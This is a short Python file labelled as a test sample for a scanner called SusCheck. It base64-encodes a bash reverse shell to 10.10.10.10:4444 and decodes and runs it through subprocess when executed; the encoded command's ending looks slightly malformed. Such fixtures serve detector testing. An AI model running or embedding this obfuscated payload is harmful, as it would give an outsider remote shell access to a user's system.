import os
import socket
import subprocess
import base64

# This is a test file for SusCheck
def run_payload():
    cmd = base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDAmMTI3").decode()
    subprocess.call(cmd, shell=True)

if __name__ == "__main__":
    run_payload()
